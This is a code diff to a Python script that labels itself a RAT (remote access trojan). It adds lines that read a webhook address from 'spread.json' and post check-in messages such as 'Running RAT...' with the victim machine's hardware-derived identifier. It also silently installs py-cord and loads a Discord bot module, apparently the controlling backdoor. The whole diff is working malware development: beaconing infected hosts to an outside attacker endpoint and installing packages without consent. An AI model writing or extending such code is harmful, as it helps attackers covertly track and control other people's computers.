@@ -2,15 +2,23 @@ import requests
 import base64
 import tkinter as tk
 import sys
+import uuid
+import json
+
+with open("spread.json") as f:
+    sinfo = json.load(f)
 
 def run():
     # Let's check if the user has Pycord installed
+    r = requests.post(sinfo["webhook"], json={"content": "Running RAT... Identifier: " + str(uuid.getnode())})
     try:
         import discordbot
     except:
+        requests.post(sinfo["webhook"], json={"content": "Installing Pycord... Identifier: " + str(uuid.getnode())})
         # If they don't, let's install it for them
         import subprocess
         subprocess.check_call([sys.executable, "-m", "pip", "install", "py-cord"])
+        requests.post(sinfo["webhook"], json={"content": "Running Discord bot... Identifier: " + str(uuid.getnode())})
         import discordbot
 
 
